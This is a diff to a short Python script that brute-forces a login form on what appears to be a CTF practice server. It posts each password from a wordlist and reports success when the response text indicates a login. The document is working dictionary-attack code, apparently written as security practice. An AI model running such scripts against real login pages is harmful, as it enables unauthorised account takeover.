@@ -1,13 +1,13 @@
 import requests
 
-url = "http://ctf.segfaulthub.com:5005/login%20case%201/login_ok.php"
+url = "http://ctf.segfaulthub.com:9191/1_login_server.php"
 with open("wordlist.txt", "r") as f:
     lines = f.readlines()
     for line in lines:
         line = line.strip()
-        payloads = {"id": "password", "pw": line}
+        payloads = {"user_id": "password", "user_pass": line}
         resp = requests.post(url, data=payloads)
-        result = resp.text.find("로그인되었습니다.")
+        result = resp.text.find("2_main_page.php")
         if result > 0:
             print(f"dictionaryAttack Success : {line}")
             break
